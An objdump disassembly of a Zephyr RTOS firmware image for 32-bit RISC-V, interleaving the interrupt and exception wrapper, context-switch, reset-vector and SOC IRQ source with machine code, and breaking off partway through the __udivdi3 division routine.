
zephyr.elf:     file format elf32-littleriscv


Disassembly of section vector:

80040000 <__start>:

	/*
	 * Set mtvec (Machine Trap-Vector Base-Address Register)
	 * to __irq_wrapper.
	 */
	la t0, __irq_wrapper
80040000:	00000297          	auipc	t0,0x0
80040004:	01c28293          	addi	t0,t0,28 # 8004001c <__irq_wrapper>
	csrw mtvec, t0
80040008:	30529073          	csrw	mtvec,t0

	/* Jump to __initialize */
	tail __initialize
8004000c:	2840206f          	j	80042290 <__initialize>
	...

Disassembly of section reset:

80040014 <__reset>:
	/*
	 * jump to __initialize
	 * use call opcode in case __initialize is far away.
	 * This will be dependent on linker.ld configuration.
	 */
	call __initialize
80040014:	27c020ef          	jal	ra,80042290 <__initialize>
	...

Disassembly of section exceptions:

8004001c <__irq_wrapper>:
 * In this architecture, system call (ECALL) is used to perform context
 * switching or IRQ offloading (when enabled).
 */
SECTION_FUNC(exception.entry, __irq_wrapper)
	/* Allocate space on thread stack to save registers */
	addi sp, sp, -__NANO_ESF_SIZEOF
8004001c:	715d                	addi	sp,sp,-80
	 * Save caller-saved registers on current thread stack.
	 * NOTE: need to be updated to account for floating-point registers
	 * floating-point registers should be accounted for when corresponding
	 * config variable is set
	 */
	sw ra, __NANO_ESF_ra_OFFSET(sp)
8004001e:	c006                	sw	ra,0(sp)
	sw gp, __NANO_ESF_gp_OFFSET(sp)
80040020:	c20e                	sw	gp,4(sp)
	sw tp, __NANO_ESF_tp_OFFSET(sp)
80040022:	c412                	sw	tp,8(sp)
	sw t0, __NANO_ESF_t0_OFFSET(sp)
80040024:	c616                	sw	t0,12(sp)
	sw t1, __NANO_ESF_t1_OFFSET(sp)
80040026:	c81a                	sw	t1,16(sp)
	sw t2, __NANO_ESF_t2_OFFSET(sp)
80040028:	ca1e                	sw	t2,20(sp)
	sw t3, __NANO_ESF_t3_OFFSET(sp)
8004002a:	cc72                	sw	t3,24(sp)
	sw t4, __NANO_ESF_t4_OFFSET(sp)
8004002c:	ce76                	sw	t4,28(sp)
	sw t5, __NANO_ESF_t5_OFFSET(sp)
8004002e:	d07a                	sw	t5,32(sp)
	sw t6, __NANO_ESF_t6_OFFSET(sp)
80040030:	d27e                	sw	t6,36(sp)
	sw a0, __NANO_ESF_a0_OFFSET(sp)
80040032:	d42a                	sw	a0,40(sp)
	sw a1, __NANO_ESF_a1_OFFSET(sp)
80040034:	d62e                	sw	a1,44(sp)
	sw a2, __NANO_ESF_a2_OFFSET(sp)
80040036:	d832                	sw	a2,48(sp)
	sw a3, __NANO_ESF_a3_OFFSET(sp)
80040038:	da36                	sw	a3,52(sp)
	sw a4, __NANO_ESF_a4_OFFSET(sp)
8004003a:	dc3a                	sw	a4,56(sp)
	sw a5, __NANO_ESF_a5_OFFSET(sp)
8004003c:	de3e                	sw	a5,60(sp)
	sw a6, __NANO_ESF_a6_OFFSET(sp)
8004003e:	c0c2                	sw	a6,64(sp)
	sw a7, __NANO_ESF_a7_OFFSET(sp)
80040040:	c2c6                	sw	a7,68(sp)

	/* Save MEPC register */
	csrr t0, mepc
80040042:	341022f3          	csrr	t0,mepc
	sw t0, __NANO_ESF_mepc_OFFSET(sp)
80040046:	c496                	sw	t0,72(sp)

	/* Save SOC-specific MSTATUS register */
	csrr t0, SOC_MSTATUS_REG
80040048:	300022f3          	csrr	t0,mstatus
	sw t0, __NANO_ESF_mstatus_OFFSET(sp)
8004004c:	c696                	sw	t0,76(sp)
	 * SOCs (like pulpino or riscv-qemu), the MSB is never set to indicate
	 * interrupt. Hence, check for interrupt/exception via the __soc_is_irq
	 * function (that needs to be implemented by each SOC). The result is
	 * returned via register a0 (1: interrupt, 0 exception)
	 */
	jal ra, __soc_is_irq
8004004e:	1ae000ef          	jal	ra,800401fc <__soc_is_irq>

	/* If a0 != 0, jump to is_interrupt */
	addi t1, x0, 0
80040052:	00000313          	li	t1,0
	bnez a0, is_interrupt
80040056:	e905                	bnez	a0,80040086 <is_interrupt>
	/*
	 * If the exception is the result of an ECALL, check whether to
	 * perform a context-switch or an IRQ offload. Otherwise call _Fault
	 * to report the exception.
	 */
	csrr t0, mcause
80040058:	342022f3          	csrr	t0,mcause
	li t2, SOC_MCAUSE_EXP_MASK
8004005c:	800003b7          	lui	t2,0x80000
80040060:	fff38393          	addi	t2,t2,-1 # 7fffffff <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80000000>
	and t0, t0, t2
80040064:	0072f2b3          	and	t0,t0,t2
	li t1, SOC_MCAUSE_ECALL_EXP
80040068:	432d                	li	t1,11

	/*
	 * If mcause == SOC_MCAUSE_ECALL_EXP, handle system call,
	 * otherwise handle fault
	 */
	beq t0, t1, is_syscall
8004006a:	00628a63          	beq	t0,t1,8004007e <is_syscall>
	 * Stack pointer is pointing to a NANO_ESF structure, pass it
	 * to _Fault (via register a0).
	 * If _Fault shall return, set return address to no_reschedule
	 * to restore stack.
	 */
	addi a0, sp, 0
8004006e:	00010513          	mv	a0,sp
	la ra, no_reschedule
80040072:	00000097          	auipc	ra,0x0
80040076:	11e08093          	addi	ra,ra,286 # 80040190 <no_reschedule>
	tail _Fault
8004007a:	1870306f          	j	80043a00 <_Fault>

8004007e <is_syscall>:
	 * again upon exiting the ISR.
	 *
	 * It's safe to always increment by 4, even with compressed
	 * instructions, because the ecall instruction is always 4 bytes.
	 */
	lw t0, __NANO_ESF_mepc_OFFSET(sp)
8004007e:	42a6                	lw	t0,72(sp)
	addi t0, t0, 4
80040080:	0291                	addi	t0,t0,4
	sw t0, __NANO_ESF_mepc_OFFSET(sp)
80040082:	c496                	sw	t0,72(sp)
#endif

	/*
	 * Go to reschedule to handle context-switch
	 */
	j reschedule
80040084:	a041                	j	80040104 <reschedule>

80040086 <is_interrupt>:
	 * Save current thread stack pointer and switch
	 * stack pointer to interrupt stack.
	 */

	/* Save thread stack pointer to temp register t0 */
	addi t0, sp, 0
80040086:	00010293          	mv	t0,sp

	/* Switch to interrupt stack */
	la t2, _kernel
8004008a:	00007397          	auipc	t2,0x7
8004008e:	1be38393          	addi	t2,t2,446 # 80047248 <_kernel>
	lw sp, _kernel_offset_to_irq_stack(t2)
80040092:	0043a103          	lw	sp,4(t2)

	/*
	 * Save thread stack pointer on interrupt stack
	 * In RISC-V, stack pointer needs to be 16-byte aligned
	 */
	addi sp, sp, -16
80040096:	1141                	addi	sp,sp,-16
	sw t0, 0x00(sp)
80040098:	c016                	sw	t0,0(sp)

8004009a <on_irq_stack>:

on_irq_stack:
	/* Increment _kernel.nested variable */
	lw t3, _kernel_offset_to_nested(t2)
8004009a:	0003ae03          	lw	t3,0(t2)
	addi t3, t3, 1
8004009e:	0e05                	addi	t3,t3,1
	sw t3, _kernel_offset_to_nested(t2)
800400a0:	01c3a023          	sw	t3,0(t2)

	/*
	 * If we are here due to a system call, t1 register should != 0.
	 * In this case, perform IRQ offloading, otherwise jump to call_irq
	 */
	beqz t1, call_irq
800400a4:	00030863          	beqz	t1,800400b4 <call_irq>
	/*
	 * Call z_irq_do_offload to handle IRQ offloading.
	 * Set return address to on_thread_stack in order to jump there
	 * upon returning from z_irq_do_offload
	 */
	la ra, on_thread_stack
800400a8:	00000097          	auipc	ra,0x0
800400ac:	03808093          	addi	ra,ra,56 # 800400e0 <on_thread_stack>
	tail z_irq_do_offload
800400b0:	1a90306f          	j	80043a58 <z_irq_do_offload>

800400b4 <call_irq>:
#ifdef CONFIG_TRACING
	call z_sys_trace_isr_enter
#endif

	/* Get IRQ causing interrupt */
	csrr a0, mcause
800400b4:	34202573          	csrr	a0,mcause
	li t0, SOC_MCAUSE_EXP_MASK
800400b8:	800002b7          	lui	t0,0x80000
800400bc:	fff28293          	addi	t0,t0,-1 # 7fffffff <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80000000>
	and a0, a0, t0
800400c0:	00557533          	and	a0,a0,t0

	/*
	 * Clear pending IRQ generating the interrupt at SOC level
	 * Pass IRQ number to __soc_handle_irq via register a0
	 */
	jal ra, __soc_handle_irq
800400c4:	128000ef          	jal	ra,800401ec <__soc_handle_irq>

	/*
	 * Call corresponding registered function in _sw_isr_table.
	 * (table is 8-bytes wide, we should shift index by 3)
	 */
	la t0, _sw_isr_table
800400c8:	00005297          	auipc	t0,0x5
800400cc:	fd828293          	addi	t0,t0,-40 # 800450a0 <_image_text_end>
	slli a0, a0, 3
800400d0:	050e                	slli	a0,a0,0x3
	add t0, t0, a0
800400d2:	92aa                	add	t0,t0,a0

	/* Load argument in a0 register */
	lw a0, 0x00(t0)
800400d4:	0002a503          	lw	a0,0(t0)

	/* Load ISR function address in register t1 */
	lw t1, 0x04(t0)
800400d8:	0042a303          	lw	t1,4(t0)
	lw t1, 0x04(sp)
	lw a0, 0x00(sp)
	addi sp, sp, 16
#endif
	/* Call ISR function */
	jalr ra, t1
800400dc:	000300e7          	jalr	t1

800400e0 <on_thread_stack>:

on_thread_stack:
	/* Get reference to _kernel */
	la t1, _kernel
800400e0:	00007317          	auipc	t1,0x7
800400e4:	16830313          	addi	t1,t1,360 # 80047248 <_kernel>

	/* Decrement _kernel.nested variable */
	lw t2, _kernel_offset_to_nested(t1)
800400e8:	00032383          	lw	t2,0(t1)
	addi t2, t2, -1
800400ec:	13fd                	addi	t2,t2,-1
	sw t2, _kernel_offset_to_nested(t1)
800400ee:	00732023          	sw	t2,0(t1)

	/* Restore thread stack pointer */
	lw t0, 0x00(sp)
800400f2:	4282                	lw	t0,0(sp)
	addi sp, t0, 0
800400f4:	00028113          	mv	sp,t0
	/*
	 * Check if we need to perform a reschedule
	 */

	/* Get pointer to _kernel.current */
	lw t2, _kernel_offset_to_current(t1)
800400f8:	00832383          	lw	t2,8(t1)

	/*
	 * Check if next thread to schedule is current thread.
	 * If yes do not perform a reschedule
	 */
	lw t3, _kernel_offset_to_ready_q_cache(t1)
800400fc:	02032e03          	lw	t3,32(t1)
	beq t3, t2, no_reschedule
80040100:	087e0863          	beq	t3,t2,80040190 <no_reschedule>

80040104 <reschedule>:
reschedule:
#if CONFIG_TRACING
	call z_sys_trace_thread_switched_in
#endif
	/* Get reference to _kernel */
	la t0, _kernel
80040104:	00007297          	auipc	t0,0x7
80040108:	14428293          	addi	t0,t0,324 # 80047248 <_kernel>

	/* Get pointer to _kernel.current */
	lw t1, _kernel_offset_to_current(t0)
8004010c:	0082a303          	lw	t1,8(t0)

	/*
	 * Save callee-saved registers of current thread
	 * prior to handle context-switching
	 */
	sw s0, _thread_offset_to_s0(t1)
80040110:	02832623          	sw	s0,44(t1)
	sw s1, _thread_offset_to_s1(t1)
80040114:	02932823          	sw	s1,48(t1)
	sw s2, _thread_offset_to_s2(t1)
80040118:	03232a23          	sw	s2,52(t1)
	sw s3, _thread_offset_to_s3(t1)
8004011c:	03332c23          	sw	s3,56(t1)
	sw s4, _thread_offset_to_s4(t1)
80040120:	03432e23          	sw	s4,60(t1)
	sw s5, _thread_offset_to_s5(t1)
80040124:	05532023          	sw	s5,64(t1)
	sw s6, _thread_offset_to_s6(t1)
80040128:	05632223          	sw	s6,68(t1)
	sw s7, _thread_offset_to_s7(t1)
8004012c:	05732423          	sw	s7,72(t1)
	sw s8, _thread_offset_to_s8(t1)
80040130:	05832623          	sw	s8,76(t1)
	sw s9, _thread_offset_to_s9(t1)
80040134:	05932823          	sw	s9,80(t1)
	sw s10, _thread_offset_to_s10(t1)
80040138:	05a32a23          	sw	s10,84(t1)
	sw s11, _thread_offset_to_s11(t1)
8004013c:	05b32c23          	sw	s11,88(t1)

	/*
	 * Save stack pointer of current thread and set the default return value
	 * of z_swap to _k_neg_eagain for the thread.
	 */
	sw sp, _thread_offset_to_sp(t1)
80040140:	02232423          	sw	sp,40(t1)
	la t2, _k_neg_eagain
80040144:	00007397          	auipc	t2,0x7
80040148:	bf838393          	addi	t2,t2,-1032 # 80046d3c <_k_neg_eagain>
	lw t3, 0x00(t2)
8004014c:	0003ae03          	lw	t3,0(t2)
	sw t3, _thread_offset_to_swap_return_value(t1)
80040150:	07c32623          	sw	t3,108(t1)

	/* Get next thread to schedule. */
	lw t1, _kernel_offset_to_ready_q_cache(t0)
80040154:	0202a303          	lw	t1,32(t0)

	/*
	 * Set _kernel.current to new thread loaded in t1
	 */
	sw t1, _kernel_offset_to_current(t0)
80040158:	0062a423          	sw	t1,8(t0)

	/* Switch to new thread stack */
	lw sp, _thread_offset_to_sp(t1)
8004015c:	02832103          	lw	sp,40(t1)

	/* Restore callee-saved registers of new thread */
	lw s0, _thread_offset_to_s0(t1)
80040160:	02c32403          	lw	s0,44(t1)
	lw s1, _thread_offset_to_s1(t1)
80040164:	03032483          	lw	s1,48(t1)
	lw s2, _thread_offset_to_s2(t1)
80040168:	03432903          	lw	s2,52(t1)
	lw s3, _thread_offset_to_s3(t1)
8004016c:	03832983          	lw	s3,56(t1)
	lw s4, _thread_offset_to_s4(t1)
80040170:	03c32a03          	lw	s4,60(t1)
	lw s5, _thread_offset_to_s5(t1)
80040174:	04032a83          	lw	s5,64(t1)
	lw s6, _thread_offset_to_s6(t1)
80040178:	04432b03          	lw	s6,68(t1)
	lw s7, _thread_offset_to_s7(t1)
8004017c:	04832b83          	lw	s7,72(t1)
	lw s8, _thread_offset_to_s8(t1)
80040180:	04c32c03          	lw	s8,76(t1)
	lw s9, _thread_offset_to_s9(t1)
80040184:	05032c83          	lw	s9,80(t1)
	lw s10, _thread_offset_to_s10(t1)
80040188:	05432d03          	lw	s10,84(t1)
	lw s11, _thread_offset_to_s11(t1)
8004018c:	05832d83          	lw	s11,88(t1)

80040190 <no_reschedule>:
	addi a0, sp, __NANO_ESF_soc_context_OFFSET
	jal ra, __soc_restore_context
#endif /* CONFIG_RISCV_SOC_CONTEXT_SAVE */

	/* Restore MEPC register */
	lw t0, __NANO_ESF_mepc_OFFSET(sp)
80040190:	42a6                	lw	t0,72(sp)
	csrw mepc, t0
80040192:	34129073          	csrw	mepc,t0

	/* Restore SOC-specific MSTATUS register */
	lw t0, __NANO_ESF_mstatus_OFFSET(sp)
80040196:	42b6                	lw	t0,76(sp)
	csrw SOC_MSTATUS_REG, t0
80040198:	30029073          	csrw	mstatus,t0

	/* Restore caller-saved registers from thread stack */
	lw ra, __NANO_ESF_ra_OFFSET(sp)
8004019c:	4082                	lw	ra,0(sp)
	lw gp, __NANO_ESF_gp_OFFSET(sp)
8004019e:	4192                	lw	gp,4(sp)
	lw tp, __NANO_ESF_tp_OFFSET(sp)
800401a0:	4222                	lw	tp,8(sp)
	lw t0, __NANO_ESF_t0_OFFSET(sp)
800401a2:	42b2                	lw	t0,12(sp)
	lw t1, __NANO_ESF_t1_OFFSET(sp)
800401a4:	4342                	lw	t1,16(sp)
	lw t2, __NANO_ESF_t2_OFFSET(sp)
800401a6:	43d2                	lw	t2,20(sp)
	lw t3, __NANO_ESF_t3_OFFSET(sp)
800401a8:	4e62                	lw	t3,24(sp)
	lw t4, __NANO_ESF_t4_OFFSET(sp)
800401aa:	4ef2                	lw	t4,28(sp)
	lw t5, __NANO_ESF_t5_OFFSET(sp)
800401ac:	5f02                	lw	t5,32(sp)
	lw t6, __NANO_ESF_t6_OFFSET(sp)
800401ae:	5f92                	lw	t6,36(sp)
	lw a0, __NANO_ESF_a0_OFFSET(sp)
800401b0:	5522                	lw	a0,40(sp)
	lw a1, __NANO_ESF_a1_OFFSET(sp)
800401b2:	55b2                	lw	a1,44(sp)
	lw a2, __NANO_ESF_a2_OFFSET(sp)
800401b4:	5642                	lw	a2,48(sp)
	lw a3, __NANO_ESF_a3_OFFSET(sp)
800401b6:	56d2                	lw	a3,52(sp)
	lw a4, __NANO_ESF_a4_OFFSET(sp)
800401b8:	5762                	lw	a4,56(sp)
	lw a5, __NANO_ESF_a5_OFFSET(sp)
800401ba:	57f2                	lw	a5,60(sp)
	lw a6, __NANO_ESF_a6_OFFSET(sp)
800401bc:	4806                	lw	a6,64(sp)
	lw a7, __NANO_ESF_a7_OFFSET(sp)
800401be:	4896                	lw	a7,68(sp)

	/* Release stack space */
	addi sp, sp, __NANO_ESF_SIZEOF
800401c0:	6161                	addi	sp,sp,80

	/* Call SOC_ERET to exit ISR */
	SOC_ERET
800401c2:	30200073          	mret
	...

800401c8 <__swap>:
	lw a7, __NANO_ESF_a7_OFFSET(sp)

	/* Release stack space */
	addi sp, sp, __NANO_ESF_SIZEOF
#endif
	ecall
800401c8:	00000073          	ecall
	 * Prior to unlocking irq, load return value of
	 * __swap to temp register t2 (from
	 * _thread_offset_to_swap_return_value). Normally, it should be -EAGAIN,
	 * unless someone has previously called z_set_thread_return_value(..).
	 */
	la t0, _kernel
800401cc:	00007297          	auipc	t0,0x7
800401d0:	07c28293          	addi	t0,t0,124 # 80047248 <_kernel>

	/* Get pointer to _kernel.current */
	lw t1, _kernel_offset_to_current(t0)
800401d4:	0082a303          	lw	t1,8(t0)

	/* Load return value of __swap function in temp register t2 */
	lw t2, _thread_offset_to_swap_return_value(t1)
800401d8:	06c32383          	lw	t2,108(t1)

	/*
	 * Unlock irq, following IRQ lock state in a0 register.
	 * Use atomic instruction csrrs to do so.
	 */
	andi a0, a0, SOC_MSTATUS_IEN
800401dc:	8921                	andi	a0,a0,8
	csrrs t0, mstatus, a0
800401de:	300522f3          	csrrs	t0,mstatus,a0

	/* Set value of return register a0 to value of register t2 */
	addi a0, t2, 0
800401e2:	00038513          	mv	a0,t2

	/* Return */
	jalr x0, ra
800401e6:	00008067          	ret
	...

800401ec <__soc_handle_irq>:
 * SOC-specific function to handle pending IRQ number generating the interrupt.
 * Exception number is given as parameter via register a0.
 */
SECTION_FUNC(exception.other, __soc_handle_irq)
	/* Clear exception number from CSR mip register */
	li t1, 1
800401ec:	4305                	li	t1,1
	sll t0, t1, a0
800401ee:	00a312b3          	sll	t0,t1,a0
	csrrc t1, mip, t0
800401f2:	3442b373          	csrrc	t1,mip,t0

	/* Return */
	jalr x0, ra
800401f6:	00008067          	ret
	...

800401fc <__soc_is_irq>:
 * return 1 (interrupt) or 0 (exception)
 *
 */
SECTION_FUNC(exception.other, __soc_is_irq)
	/* Read mcause and check if interrupt bit is set */
	csrr t0, mcause
800401fc:	342022f3          	csrr	t0,mcause
	li t1, SOC_MCAUSE_IRQ_MASK
80040200:	80000337          	lui	t1,0x80000
	and t0, t0, t1
80040204:	0062f2b3          	and	t0,t0,t1

	/* If interrupt bit is not set, return with 0 */
	addi a0, x0, 0
80040208:	00000513          	li	a0,0
	beqz t0, not_interrupt
8004020c:	00028363          	beqz	t0,80040212 <not_interrupt>
	addi a0, a0, 1
80040210:	0505                	addi	a0,a0,1

80040212 <not_interrupt>:

not_interrupt:
	/* return */
	jalr x0, ra
80040212:	00008067          	ret

Disassembly of section text:

80040218 <__udivdi3>:
80040218:	00058793          	mv	a5,a1
8004021c:	00060813          	mv	a6,a2
80040220:	00068713          	mv	a4,a3
80040224:	00050313          	mv	t1,a0
80040228:	28069663          	bnez	a3,800404b4 <__udivdi3+0x29c>
8004022c:	800458b7          	lui	a7,0x80045
80040230:	1d488893          	addi	a7,a7,468 # 800451d4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800451d5>
80040234:	0ec5f663          	bgeu	a1,a2,80040320 <__udivdi3+0x108>
80040238:	00010737          	lui	a4,0x10
8004023c:	0ce67863          	bgeu	a2,a4,8004030c <__udivdi3+0xf4>
80040240:	0ff00693          	li	a3,255
80040244:	00c6b6b3          	sltu	a3,a3,a2
80040248:	00369693          	slli	a3,a3,0x3
8004024c:	00d65733          	srl	a4,a2,a3
80040250:	00e888b3          	add	a7,a7,a4
80040254:	0008c703          	lbu	a4,0(a7)
80040258:	00d706b3          	add	a3,a4,a3
8004025c:	02000713          	li	a4,32
80040260:	40d70733          	sub	a4,a4,a3
80040264:	00070c63          	beqz	a4,8004027c <__udivdi3+0x64>
80040268:	00e797b3          	sll	a5,a5,a4
8004026c:	00d556b3          	srl	a3,a0,a3
80040270:	00e61833          	sll	a6,a2,a4
80040274:	00f6e5b3          	or	a1,a3,a5
80040278:	00e51333          	sll	t1,a0,a4
8004027c:	01085513          	srli	a0,a6,0x10
80040280:	02a5f733          	remu	a4,a1,a0
80040284:	01081613          	slli	a2,a6,0x10
80040288:	01065613          	srli	a2,a2,0x10
8004028c:	01035693          	srli	a3,t1,0x10
80040290:	02a5d5b3          	divu	a1,a1,a0
80040294:	01071713          	slli	a4,a4,0x10
80040298:	00d766b3          	or	a3,a4,a3
8004029c:	02b607b3          	mul	a5,a2,a1
800402a0:	00058713          	mv	a4,a1
800402a4:	00f6fe63          	bgeu	a3,a5,800402c0 <__udivdi3+0xa8>
800402a8:	010686b3          	add	a3,a3,a6
800402ac:	fff58713          	addi	a4,a1,-1
800402b0:	0106e863          	bltu	a3,a6,800402c0 <__udivdi3+0xa8>
800402b4:	00f6f663          	bgeu	a3,a5,800402c0 <__udivdi3+0xa8>
800402b8:	ffe58713          	addi	a4,a1,-2
800402bc:	010686b3          	add	a3,a3,a6
800402c0:	40f686b3          	sub	a3,a3,a5
800402c4:	02a6f7b3          	remu	a5,a3,a0
800402c8:	01031313          	slli	t1,t1,0x10
800402cc:	01035313          	srli	t1,t1,0x10
800402d0:	02a6d6b3          	divu	a3,a3,a0
800402d4:	01079793          	slli	a5,a5,0x10
800402d8:	0067e333          	or	t1,a5,t1
800402dc:	02d605b3          	mul	a1,a2,a3
800402e0:	00068513          	mv	a0,a3
800402e4:	00b37c63          	bgeu	t1,a1,800402fc <__udivdi3+0xe4>
800402e8:	00680333          	add	t1,a6,t1
800402ec:	fff68513          	addi	a0,a3,-1
800402f0:	01036663          	bltu	t1,a6,800402fc <__udivdi3+0xe4>
800402f4:	00b37463          	bgeu	t1,a1,800402fc <__udivdi3+0xe4>
800402f8:	ffe68513          	addi	a0,a3,-2
800402fc:	01071713          	slli	a4,a4,0x10
80040300:	00a76733          	or	a4,a4,a0
80040304:	00000593          	li	a1,0
80040308:	0e40006f          	j	800403ec <__udivdi3+0x1d4>
8004030c:	01000737          	lui	a4,0x1000
80040310:	01000693          	li	a3,16
80040314:	f2e66ce3          	bltu	a2,a4,8004024c <__udivdi3+0x34>
80040318:	01800693          	li	a3,24
8004031c:	f31ff06f          	j	8004024c <__udivdi3+0x34>
80040320:	00061663          	bnez	a2,8004032c <__udivdi3+0x114>
80040324:	00100693          	li	a3,1
80040328:	02c6d833          	divu	a6,a3,a2
8004032c:	000106b7          	lui	a3,0x10
80040330:	0cd87263          	bgeu	a6,a3,800403f4 <__udivdi3+0x1dc>
80040334:	0ff00693          	li	a3,255
80040338:	0106f463          	bgeu	a3,a6,80040340 <__udivdi3+0x128>
8004033c:	00800713          	li	a4,8
80040340:	00e856b3          	srl	a3,a6,a4
80040344:	00d888b3          	add	a7,a7,a3
80040348:	0008c683          	lbu	a3,0(a7)
8004034c:	00e686b3          	add	a3,a3,a4
80040350:	02000713          	li	a4,32
80040354:	40d70733          	sub	a4,a4,a3
80040358:	0a071863          	bnez	a4,80040408 <__udivdi3+0x1f0>
8004035c:	410787b3          	sub	a5,a5,a6
80040360:	00100593          	li	a1,1
80040364:	01085613          	srli	a2,a6,0x10
80040368:	01081893          	slli	a7,a6,0x10
8004036c:	0108d893          	srli	a7,a7,0x10
80040370:	01035693          	srli	a3,t1,0x10
80040374:	02c7f733          	remu	a4,a5,a2
80040378:	02c7d7b3          	divu	a5,a5,a2
8004037c:	01071713          	slli	a4,a4,0x10
80040380:	00d766b3          	or	a3,a4,a3
80040384:	02f88533          	mul	a0,a7,a5
80040388:	00078713          	mv	a4,a5
8004038c:	00a6fe63          	bgeu	a3,a0,800403a8 <__udivdi3+0x190>
80040390:	010686b3          	add	a3,a3,a6
80040394:	fff78713          	addi	a4,a5,-1
80040398:	0106e863          	bltu	a3,a6,800403a8 <__udivdi3+0x190>
8004039c:	00a6f663          	bgeu	a3,a0,800403a8 <__udivdi3+0x190>
800403a0:	ffe78713          	addi	a4,a5,-2
800403a4:	010686b3          	add	a3,a3,a6
800403a8:	40a686b3          	sub	a3,a3,a0
800403ac:	02c6f7b3          	remu	a5,a3,a2
800403b0:	01031313          	slli	t1,t1,0x10
800403b4:	01035313          	srli	t1,t1,0x10
800403b8:	02c6d6b3          	divu	a3,a3,a2
800403bc:	01079793          	slli	a5,a5,0x10
800403c0:	0067e333          	or	t1,a5,t1
800403c4:	02d888b3          	mul	a7,a7,a3
800403c8:	00068513          	mv	a0,a3
800403cc:	01137c63          	bgeu	t1,a7,800403e4 <__udivdi3+0x1cc>
800403d0:	00680333          	add	t1,a6,t1
800403d4:	fff68513          	addi	a0,a3,-1 # ffff <CONFIG_ISR_STACK_SIZE+0xefff>
800403d8:	01036663          	bltu	t1,a6,800403e4 <__udivdi3+0x1cc>
800403dc:	01137463          	bgeu	t1,a7,800403e4 <__udivdi3+0x1cc>
800403e0:	ffe68513          	addi	a0,a3,-2
800403e4:	01071713          	slli	a4,a4,0x10
800403e8:	00a76733          	or	a4,a4,a0
800403ec:	00070513          	mv	a0,a4
800403f0:	00008067          	ret
800403f4:	010006b7          	lui	a3,0x1000
800403f8:	01000713          	li	a4,16
800403fc:	f4d862e3          	bltu	a6,a3,80040340 <__udivdi3+0x128>
80040400:	01800713          	li	a4,24
80040404:	f3dff06f          	j	80040340 <__udivdi3+0x128>
80040408:	00e81833          	sll	a6,a6,a4
8004040c:	00d7d5b3          	srl	a1,a5,a3
80040410:	00e51333          	sll	t1,a0,a4
80040414:	00d556b3          	srl	a3,a0,a3
80040418:	01085513          	srli	a0,a6,0x10
8004041c:	00e797b3          	sll	a5,a5,a4
80040420:	02a5f733          	remu	a4,a1,a0
80040424:	00f6e8b3          	or	a7,a3,a5
80040428:	01081793          	slli	a5,a6,0x10
8004042c:	0107d793          	srli	a5,a5,0x10
80040430:	0108d613          	srli	a2,a7,0x10
80040434:	02a5d5b3          	divu	a1,a1,a0
80040438:	01071713          	slli	a4,a4,0x10
8004043c:	00c76733          	or	a4,a4,a2
80040440:	02b786b3          	mul	a3,a5,a1
80040444:	00058613          	mv	a2,a1
80040448:	00d77e63          	bgeu	a4,a3,80040464 <__udivdi3+0x24c>
8004044c:	01070733          	add	a4,a4,a6
80040450:	fff58613          	addi	a2,a1,-1
80040454:	01076863          	bltu	a4,a6,80040464 <__udivdi3+0x24c>
80040458:	00d77663          	bgeu	a4,a3,80040464 <__udivdi3+0x24c>
8004045c:	ffe58613          	addi	a2,a1,-2
80040460:	01070733          	add	a4,a4,a6
80040464:	40d706b3          	sub	a3,a4,a3
80040468:	02a6f733          	remu	a4,a3,a0
8004046c:	01089893          	slli	a7,a7,0x10
80040470:	0108d893          	srli	a7,a7,0x10
80040474:	02a6d6b3          	divu	a3,a3,a0
80040478:	01071713          	slli	a4,a4,0x10
8004047c:	02d785b3          	mul	a1,a5,a3
80040480:	011767b3          	or	a5,a4,a7
80040484:	00068713          	mv	a4,a3
80040488:	00b7fe63          	bgeu	a5,a1,800404a4 <__udivdi3+0x28c>
8004048c:	010787b3          	add	a5,a5,a6
80040490:	fff68713          	addi	a4,a3,-1 # ffffff <CONFIG_SYS_CLOCK_HW_CYCLES_PER_SEC+0xf85edf>
80040494:	0107e863          	bltu	a5,a6,800404a4 <__udivdi3+0x28c>
80040498:	00b7f663          	bgeu	a5,a1,800404a4 <__udivdi3+0x28c>
8004049c:	ffe68713          	addi	a4,a3,-2
800404a0:	010787b3          	add	a5,a5,a6
800404a4:	40b787b3          	sub	a5,a5,a1
800404a8:	01061593          	slli	a1,a2,0x10
800404ac:	00e5e5b3          	or	a1,a1,a4
800404b0:	eb5ff06f          	j	80040364 <__udivdi3+0x14c>
800404b4:	18d5e663          	bltu	a1,a3,80040640 <__udivdi3+0x428>
800404b8:	00010737          	lui	a4,0x10
800404bc:	04e6f463          	bgeu	a3,a4,80040504 <__udivdi3+0x2ec>
800404c0:	0ff00813          	li	a6,255
800404c4:	00d835b3          	sltu	a1,a6,a3
800404c8:	00359593          	slli	a1,a1,0x3
800404cc:	80045737          	lui	a4,0x80045
800404d0:	00b6d833          	srl	a6,a3,a1
800404d4:	1d470713          	addi	a4,a4,468 # 800451d4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800451d5>
800404d8:	01070733          	add	a4,a4,a6
800404dc:	00074803          	lbu	a6,0(a4)
800404e0:	00b80833          	add	a6,a6,a1
800404e4:	02000593          	li	a1,32
800404e8:	410585b3          	sub	a1,a1,a6
800404ec:	02059663          	bnez	a1,80040518 <__udivdi3+0x300>
800404f0:	00100713          	li	a4,1
800404f4:	eef6ece3          	bltu	a3,a5,800403ec <__udivdi3+0x1d4>
800404f8:	00c53633          	sltu	a2,a0,a2
800404fc:	00164713          	xori	a4,a2,1
80040500:	eedff06f          	j	800403ec <__udivdi3+0x1d4>
80040504:	01000737          	lui	a4,0x1000
80040508:	01000593          	li	a1,16
8004050c:	fce6e0e3          	bltu	a3,a4,800404cc <__udivdi3+0x2b4>
80040510:	01800593          	li	a1,24
80040514:	fb9ff06f          	j	800404cc <__udivdi3+0x2b4>
80040518:	01065733          	srl	a4,a2,a6
8004051c:	00b696b3          	sll	a3,a3,a1
80040520:	00d766b3          	or	a3,a4,a3
80040524:	0106de93          	srli	t4,a3,0x10
80040528:	0107d733          	srl	a4,a5,a6
8004052c:	03d778b3          	remu	a7,a4,t4
80040530:	00b797b3          	sll	a5,a5,a1
80040534:	01055833          	srl	a6,a0,a6
80040538:	00f86333          	or	t1,a6,a5
8004053c:	01069793          	slli	a5,a3,0x10
80040540:	0107d793          	srli	a5,a5,0x10
80040544:	01035813          	srli	a6,t1,0x10
80040548:	00b61633          	sll	a2,a2,a1
8004054c:	03d75733          	divu	a4,a4,t4
80040550:	01089893          	slli	a7,a7,0x10
80040554:	0108e833          	or	a6,a7,a6
